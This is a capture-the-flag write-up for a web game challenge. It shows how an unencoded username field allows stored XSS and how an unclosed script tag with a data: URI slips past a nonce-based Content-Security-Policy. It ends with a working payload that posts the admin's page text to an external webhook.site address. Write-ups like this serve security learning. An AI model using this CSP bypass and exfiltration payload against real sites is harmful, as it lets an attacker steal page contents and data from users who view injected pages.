# writeup
## vulnerabilities
```html
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv='Content-Security-Policy' content="script-src 'nonce-4dc4293206eb1026ae18a5a225fc541c'">
		<title>snek nomnomnom</title>
	</head>
	<body>
		
		<h2>snek goes <em>nomnomnom</em></h2><br />
		Check out this score of 1! <br />
		<a href='/'>Play!</a> <button id='reporter'>Report.</button> <br />
		<br />
		This score was set by test
		<script nonce='4dc4293206eb1026ae18a5a225fc541c'>
function report() {
	fetch('/report/cd1f68caedfec30b', {
		method: 'POST'
	})
}

document.getElementById('reporter').onclick = () => { report() }
		</script> 
		
	</body>
</html>
```

The username field is not encoded but there is a CSP to prevent untrusted js code execution.

To bypass this, we can use payload `<script src="data:, alert(1);"`. The code is executed.

```

<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv='Content-Security-Policy' content="script-src 'nonce-109bb5a257129cbe2b005bb69126f3cd'">
		<title>snek nomnomnom</title>
	</head>
	<body>
		
		<h2>snek goes <em>nomnomnom</em></h2><br />
		Check out this score of 1! <br />
		<a href='/'>Play!</a> <button id='reporter'>Report.</button> <br />
		<br />
		This score was set by <script src="data:, alert(1);"
		<script nonce='109bb5a257129cbe2b005bb69126f3cd'>
function report() {
	fetch('/report/dba44ee7e1eca24b', {
		method: 'POST'
	})
}

document.getElementById('reporter').onclick = () => { report() }
		</script> 
		
	</body>
</html>
```

If we use this payload, and report it to the admin using report() function, we can get the flag: (we may need to redefine report function in console)

<script src="data:text/javascript, fetch('https://webhook.site/aa5d5a1d-0995-426c-b73d-a0bca1c5a775', {method: 'POST', mode: 'no-cors', body: document.body.innerText})"